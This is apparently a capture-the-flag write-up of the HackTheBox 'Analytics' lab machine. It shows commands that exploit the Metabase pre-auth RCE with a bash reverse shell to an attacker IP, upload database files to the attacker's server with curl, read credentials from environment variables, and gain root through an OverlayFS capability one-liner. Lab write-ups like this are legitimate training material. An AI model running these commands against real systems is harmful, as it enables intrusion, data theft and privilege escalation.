![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5873ab34-0ad9-41bf-81b6-c744cc7e022c)### 09-Feb-24-Fri

[Analytics](https://app.hackthebox.com/machines/Analytics)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e2a3bdac-1f7f-4a53-b357-ea42e9f1a31b)

```
echo '10.129.229.224 analytical.htb' | sudo tee -a /etc/hosts
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/86e2cd59-9a57-480a-bf1b-7abbff2032ff)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/daa2364e-1a72-4467-875d-22feb686da1d)

http://data.analytical.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f864da79-20a7-4dfd-9e90-5421a9f05a65)

```
echo '10.129.229.224 data.analytical.htb' | sudo tee -a /etc/hosts
```

http://data.analytical.htb/auth/login?redirect=%2F

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/e753c17b-94da-41d8-b668-e8d8a72811f0)

http://data.analytical.htb/auth/forgot_password

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/89732dad-9ac7-4c18-8a10-a9d258d7ab77)

*metabase exploit*

https://github.com/m3m0o/metabase-pre-auth-rce-poc

https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396

GET /api/session/properties

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/33fc4d6b-cf5f-40be-bc6c-36768cc97287)

```
249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```

http://data.analytical.htb/api/session/properties

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b440e06b-80dc-421c-ae35-3d771fbea096)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f5840215-c098-4365-ad00-41293f959f2d)

```
python3 metabase-pre-auth-rce-poc.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.16.20/1337 0>&1"
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/147b1243-ba63-4e5a-ab82-d47e1cca5903)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/f6317317-beca-4d89-a8ba-4a8603decf60)

```
curl -X POST http://10.10.16.20:8000/upload -F 'files=@metabase.db.mv.db' -F 'files=@metabase.db.trace.db'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/da811da4-8622-40b8-8f67-127332bea47f)

```
python3 -m uploadserver
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c6500035-1360-4169-8b65-58e38c192bbd)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/8fcb988d-075e-4929-83c1-5c855c1d6d99)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/986e0410-b903-4140-9faf-0a78bd551e64)

*Credits* - https://maddevs.io/writeups/hackthebox-analytics/ **Walkthrough/Writeup**

```
cat /proc/self/environ
```

SHELL=/bin/shMB_DB_PASS=HOSTNAME=d5d0efd9b524
LANGUAGE=en_US:enMB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/metabase.db
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=HOME=/home/metabase
LANG=en_US.UTF-8META_

USER=metalytics
META_PASS=An4lytics_ds20223#

MB_EMAIL_SMTP_PASSWORD=USER=metabaseSHLVL=4MB_DB_USER=FC_LANG=en-USLD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libLC_CTYPE=en_US.UTF-8MB_LDAP_BIND_DN=LC_ALL=en_US.UTF-8MB_LDAP_PASSWORD=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_CONNECTION_URI=JAVA_VERSION=jdk-11.0.19+7_=/bin/catOLDPWD=/

```
ssh metalytics@analytical.htb
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/266b4d81-b327-4fd2-acb7-d94e362a5f13)

```
3cc9cb4a53a439a1f4b2509cd087c8d8
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d5f86b23-100d-46e8-9329-41a9cba0db49)

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/dab990ff-1eb0-456c-88a2-51f488294019)

```
fc633b1a858073995e19951e50beadf4
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/6388f1a4-c2e6-4d01-b145-2cace850bdf4)
